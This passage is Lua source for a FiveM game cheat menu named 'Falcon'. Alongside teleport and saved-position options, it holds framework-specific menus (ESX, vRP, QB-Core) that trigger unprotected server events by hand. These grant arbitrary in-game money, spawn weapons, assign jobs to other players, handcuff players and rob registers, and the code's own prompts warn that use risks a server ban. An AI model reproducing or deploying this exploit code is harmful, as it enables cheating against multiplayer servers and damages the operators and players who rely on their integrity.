                        SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
                    elseif selPFuncIndex == 5 then
                        SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
                    elseif selPFuncIndex == 6 then
                        SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
                    elseif selPFuncIndex == 7 then
                        SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
                    elseif selPFuncIndex == 8 then
                        SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
                    elseif selPFuncIndex == 9 then
                        SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
                    elseif selPFuncIndex == 10 then
                        SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
                    elseif selPFuncIndex == 11 then
                        SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
                    elseif selPFuncIndex == 12 then
                        SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
                    elseif selPFuncIndex == 13 then
                        SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
                    end
            elseif Falcon.Button('Teleport To Waypoint') then
				TeleportToWaypoint()
            end
        

        elseif Falcon.IsMenuOpened('saveload') then
            if Falcon.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                currSaveLoadIndex1 = currentIndex
                selSaveLoadIndex1 = currentIndex
            end) then
                if selSaveLoadIndex1 == 1 then
                    savedpos1 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 1 Saved")
                else
                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~g~Position 1 Loaded")
                    end
                end
            elseif Falcon.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                currSaveLoadIndex2 = currentIndex
                selSaveLoadIndex2 = currentIndex
            end) then
                if selSaveLoadIndex2 == 1 then
                    savedpos2 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 2 Saved")
                else
                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~g~Position 2 Loaded")
                    end
                end
            elseif Falcon.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                currSaveLoadIndex3 = currentIndex
                selSaveLoadIndex3 = currentIndex
            end) then
                if selSaveLoadIndex3 == 1 then
                    savedpos3 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 3 Saved")
                else
                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~g~Position 3 Loaded")
                    end
                end
            elseif Falcon.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                currSaveLoadIndex4 = currentIndex
                selSaveLoadIndex4 = currentIndex
            end) then
                if selSaveLoadIndex4 == 1 then
                    savedpos4 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 4 Saved")
                else
                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~g~Position 4 Loaded")
                    end
                end
            elseif Falcon.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                currSaveLoadIndex5 = currentIndex
                selSaveLoadIndex5 = currentIndex
            end) then
                if selSaveLoadIndex5 == 1 then
                    savedpos5 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 5 Saved")
                else
                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~g~Position 5 Loaded")
                    end
                end
            end
        

        elseif Falcon.IsMenuOpened('pois') then
            if Falcon.Button("~h~~y~»~b~ Car Dealership (Simeon's)") then
                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
            elseif Falcon.Button("~h~~y~»~b~ Legion Square") then
                SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
            elseif Falcon.Button("~h~~y~»~b~ Grove Street") then
                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
            elseif Falcon.Button("~h~~y~»~b~ LSPD HQ") then
                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
            elseif Falcon.Button("~h~~y~»~b~ Sandy Shores BCSO HQ") then
                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
            elseif Falcon.Button("~h~~y~»~b~ Paleto Bay BCSO HQ") then
                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
            elseif Falcon.Button("~h~~y~»~b~ FIB Top Floor") then
                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
            elseif Falcon.Button("~h~~y~»~b~ FIB Offices") then
                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
            elseif Falcon.Button("~h~~y~»~b~ Michael's House") then
                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
            elseif Falcon.Button("~h~~y~»~b~ Franklin's First House") then
                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
            elseif Falcon.Button("~h~~y~»~b~ Franklin's Second House") then
                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
            elseif Falcon.Button("~h~~y~»~b~ Trevor's Trailer") then
                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
            elseif Falcon.Button("~h~~y~»~b~ Tequi-La-La") then
                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
            end
        
        elseif Falcon.IsMenuOpened('settings') then
        if Falcon.MenuButton("~r~→  ~s~Information", 'info') then
        elseif Falcon.MenuButton("~r~→  ~s~Credits", 'credits') then
        elseif Falcon.ComboBox("~r~»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
            currentMenuX = currentIndex
            selectedMenuX = currentIndex
            for i = 1, #menulist do
                Falcon.SetMenuX(menulist[i], menuX[currentMenuX])
            end
            end) 
            then
        elseif Falcon.ComboBox("~r~»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
            currentMenuY = currentIndex
            selectedMenuY = currentIndex
            for i = 1, #menulist do
                Falcon.SetMenuY(menulist[i], menuY[currentMenuY])
            end
            end)
            then
            elseif Falcon.CheckBox("~b~Discord ~s~Presence", discordPresence) then
                discordPresence = not discordPresence
            end
    

        elseif Falcon.IsMenuOpened('lua') then
            if Falcon.MenuButton('~r~→  ~s~ESX Options', 'esx') then
                elseif Falcon.MenuButton('~r~→  ~s~vRP Options', 'vrp') then
                elseif Falcon.MenuButton('~r~→  ~s~Other', 'other') then
                elseif Falcon.MenuButton('~r~→  ~s~Devo Options', 'devo') then
                elseif Falcon.MenuButton('~r~→  ~s~QB-Core Options', 'qb-core') then
                    end
        
                elseif Falcon.IsMenuOpened('other') then
                    if Falcon.Button("~r~Remove Job") then
                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif Falcon.Button("~s~Recruit~c~ Mechanic") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
                    elseif Falcon.Button("~s~Recruit~b~ Police") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                        TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                    elseif Falcon.Button("~s~Recruit~c~ Mafia") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
                        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
                    elseif Falcon.Button("~s~Recruit~p~ Gang") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
                        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
                    elseif Falcon.Button("~s~Recruit~y~ Taxi") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
                        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
                    elseif Falcon.Button("~s~Recruit~r~ Inem") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
                        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
                    end

                elseif Falcon.IsMenuOpened('devo') then
                    if Falcon.Button("Spawn ~r~10 ~s~million") then
                        TriggerServerEvent("scrap:SellVehicle", 10000000)
                    elseif Falcon.Button("Handcuff nearest player") then
                        TriggerServerEvent('handcuff:cuffHim')
                    elseif Falcon.CheckBox("~s~Harvest ~g~Cocaine ~s~Leaves", HCocain) then
                        HCocain = not HCocain
                    elseif Falcon.CheckBox("~s~Make ~g~Cocain ~s~(With Leaves)", HCocain2) then
                        HCocain2 = not HCocain2
                    elseif Falcon.CheckBox("~s~Sell ~g~Cocain", HCocain3) then
                        HCocain3 = not HCocain3
                    elseif Falcon.CheckBox("~s~Harvest ~g~Cannabis ~s~Leaves", Hhash) then
                        Hhash = not Hhash
                    elseif Falcon.CheckBox("~s~Make ~g~Cannabis ~s~(With leaves)", Hhash2) then
                        Hhash2 = not Hhash2
                    elseif Falcon.CheckBox("~s~Sell ~g~Cannabis", Hhash3) then
                        Hhash3 = not Hhash3
                    elseif Falcon.CheckBox("~s~Harvest ~g~Acid", Hsyre) then
                        Hsyre = not Hsyre
                    elseif Falcon.CheckBox("~s~Make ~g~LSD ~s~(With Acid)", Hsyre2) then
                        Hsyre2 = not Hsyre2
                    elseif Falcon.CheckBox("~s~Sell ~g~LSD", Hsyre3) then
                        Hsyre3 = not Hsyre3
                    elseif Falcon.CheckBox("Money ~b~laundering", Hvidvask) then
                        Hvidvask = not Hvidvask
                    elseif Falcon.Button("Bank Deposit All") then
                        TriggerServerEvent('bank:depositAll')
                    end

                elseif Falcon.IsMenuOpened('qb-core') then
                    if Falcon.Button("Spawn ~r~1 ~s~Pistol50") then
                        TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol50", 1)
                    elseif Falcon.Button("Spawn ~r~1 ~s~AP Pistol") then
                        TriggerServerEvent('QBCore:Server:AddItem', "weapon_appistol", 1)    
                    elseif Falcon.Button("Spawn ~r~1~s~ Machine Pistol") then
                        TriggerServerEvent('QBCore:Server:AddItem', "weapon_machinepistol", 1)    
                    elseif Falcon.Button("Spawn ~r~10~s~ Pistol Mags") then
                        TriggerServerEvent('QBCore:Server:AddItem', "pistol_ammo", 10)                  
                    elseif Falcon.Button("Fill Hunger and Thirst") then
                        TriggerServerEvent("QBCore:Server:SetMetaData", "hunger", 100)
                        TriggerServerEvent("QBCore:Server:SetMetaData", "thirst", 100)
                    elseif Falcon.Button("Respawn at Hospital") then
                        TriggerEvent("hospital:client:RespawnAtHospital")
                    elseif Falcon.Button("~r~Uncuff/Cuff ~s~ yourself") then
                        TriggerEvent("police:client:GetCuffed", -1)
                    elseif Falcon.Button("Spawn Money ~r~1 Mil~s~ (semi work)") then
                        TriggerServerEvent('qb-hotdogjob:server:Sell', 1, 1000000)
                    elseif Falcon.Button("Spawn Money ~r~10 Mil~s~ (semi work)") then
                        TriggerServerEvent('qb-hotdogjob:server:Sell', 1, 10000000)
                    elseif Falcon.Button("Steal from Register (~r~Store Robbery~s~)") then
                        TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, true)
                    end

        elseif Falcon.IsMenuOpened('esx') then
            if Falcon.Button("~g~Money~s~ 1 | ~b~vRP ~r~ (RISK)") then
                local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                
                 if string.lower(confirm) == "y" then
                 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                    
                    TriggerServerEvent('esx_truckerjob:pay', result)
                    TriggerServerEvent('vrp_slotmachine:server:2', result)
                    TriggerServerEvent("esx_pizza:pay", result)
                    TriggerServerEvent('esx_jobs:caution', 'give_back', result)
                    TriggerServerEvent('lscustoms:payGarage', result)
                    TriggerServerEvent('esx_tankerjob:pay', result)
                    TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
                    TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
                    TriggerServerEvent('gambling:spend', result)
                    TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
                    TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
                    TriggerServerEvent('AdminMenu:giveBank', result)
                    TriggerServerEvent('AdminMenu:giveCash', result)
                    TriggerServerEvent('esx_slotmachine:sv:2', result)
                    TriggerServerEvent('esx_moneywash:deposit', result)
                    TriggerServerEvent('esx_moneywash:withdraw', result)
                    TriggerServerEvent('esx_moneywash:deposit', result)
                    TriggerServerEvent('mission:completed', result)
                    TriggerServerEvent('truckerJob:success',result)
                    TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
                    TriggerServerEvent("dropOff", result)
                    TriggerServerEvent('truckerfuel:success',result)
                    TriggerServerEvent('delivery:success',result)
                    TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                    TriggerServerEvent("esx_brinksjob:pay", result)
                    TriggerServerEvent("esx_garbagejob:pay", result)
                    TriggerServerEvent("esx_postejob:pay", result)
                    TriggerServerEvent('esx_garbage:pay', result)
                    TriggerServerEvent("esx_carteirojob:pay", result)
                    else
                        ShowInfo("~r~Operation Canceled")
                    end
                elseif Falcon.Button("~g~Money~s~ 2 | ~b~ESX ~r~(RISK)") then
                    local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                
                    if string.lower(confirm) == "y" then
                    local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    else
                        ShowInfo("~r~Operation Canceled")
                    end
                elseif Falcon.Button("~g~Money~s~ 3 | ~b~ESX ~r~(RISK)") then
                    local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                    
                     if string.lower(confirm) == "y" then
                     local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                        TriggerServerEvent("esx_godirtyjob:pay", result)
                        TriggerServerEvent("esx_pizza:pay", result)
                        TriggerServerEvent("esx_slotmachine:sv:2", result)
                        TriggerServerEvent("esx_banksecurity:pay", result)
                        TriggerServerEvent("esx_gopostaljob:pay", result)
                        TriggerServerEvent("esx_truckerjob:pay", result)
                        TriggerServerEvent("esx_carthief:pay", result)
                        TriggerServerEvent("esx_garbagejob:pay", result)
                        TriggerServerEvent("esx_ranger:pay", result)
                        TriggerServerEvent("esx_truckersjob:payy", result)
                        TriggerServerEvent("esx_godirtyjob:pay", result)
                        TriggerServerEvent("dropOff",result)
                        TriggerServerEvent("PayForRepairNow",-result)
                        else
                            ShowInfo("~r~Operation Canceled")
                        end 
        elseif Falcon.Button("~b~ESX ~w~Money ~g~500k+") then
                TriggerServerEvent('esx_truckerjob:pay', 500000)
				TriggerServerEvent('vrp_slotmachine:server:2', 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 500000)
				TriggerServerEvent('lscustoms:payGarage', 500000)
				TriggerServerEvent('esx_tankerjob:pay', 500000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 500000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 500000)
				TriggerServerEvent('gambling:spend', 500000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)
				TriggerServerEvent('AdminMenu:giveCash', 500000)
				TriggerServerEvent('esx_slotmachine:sv:2', 500000)
				TriggerServerEvent('esx_truckerjob:pay', 500000)
				TriggerServerEvent('esx_moneywash:deposit', 500000)
				TriggerServerEvent('esx_moneywash:withdraw', 500000)
				TriggerServerEvent('esx_moneywash:deposit', 500000)
			    TriggerServerEvent('mission:completed', 500000)
				TriggerServerEvent('truckerJob:success',500000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 500000)
				TriggerServerEvent("dropOff", 500000)
				TriggerServerEvent('truckerfuel:success',500000)
				TriggerServerEvent('delivery:success',500000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -500000})
				TriggerServerEvent("esx_brinksjob:pay", 500000)
				TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_postejob:pay", 500000)
				TriggerServerEvent('esx_garbage:pay', 500000)
            elseif Falcon.Button("~b~ESX ~w~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif Falcon.Button("~b~ESX ~w~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif Falcon.Button("~b~ESX ~w~Revive Self") then
                TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
            elseif Falcon.Button("~b~ESX ~w~Revive By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent('esx_ambulancejob:revive', serverID)
            end
        
        

        elseif Falcon.IsMenuOpened('vrp') then
            if Falcon.Button("~g~Money~s~ 1 | ~b~vRP ~r~ (RISK)") then
                local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                
                 if string.lower(confirm) == "y" then
                 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                    
                    TriggerServerEvent('esx_truckerjob:pay', result)
                    TriggerServerEvent('vrp_slotmachine:server:2', result)
                    TriggerServerEvent("esx_pizza:pay", result)
                    TriggerServerEvent('esx_jobs:caution', 'give_back', result)
                    TriggerServerEvent('lscustoms:payGarage', result)
                    TriggerServerEvent('esx_tankerjob:pay', result)
                    TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
                    TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
                    TriggerServerEvent('gambling:spend', result)
                    TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
                    TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
                    TriggerServerEvent('AdminMenu:giveBank', result)
                    TriggerServerEvent('AdminMenu:giveCash', result)
                    TriggerServerEvent('esx_slotmachine:sv:2', result)
                    TriggerServerEvent('esx_moneywash:deposit', result)
                    TriggerServerEvent('esx_moneywash:withdraw', result)
                    TriggerServerEvent('esx_moneywash:deposit', result)
                    TriggerServerEvent('mission:completed', result)
                    TriggerServerEvent('truckerJob:success',result)
                    TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
                    TriggerServerEvent("dropOff", result)
                    TriggerServerEvent('truckerfuel:success',result)
                    TriggerServerEvent('delivery:success',result)
                    TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                    TriggerServerEvent("esx_brinksjob:pay", result)
                    TriggerServerEvent("esx_garbagejob:pay", result)
                    TriggerServerEvent("esx_postejob:pay", result)
                    TriggerServerEvent('esx_garbage:pay', result)
                    TriggerServerEvent("esx_carteirojob:pay", result)
                    else
                        ShowInfo("~r~Operation Canceled")
                    end
                elseif Falcon.Button("~g~Money~s~ 2 | ~b~vRP ~r~(RISK)") then
                    local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                
                    if string.lower(confirm) == "y" then
                    local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
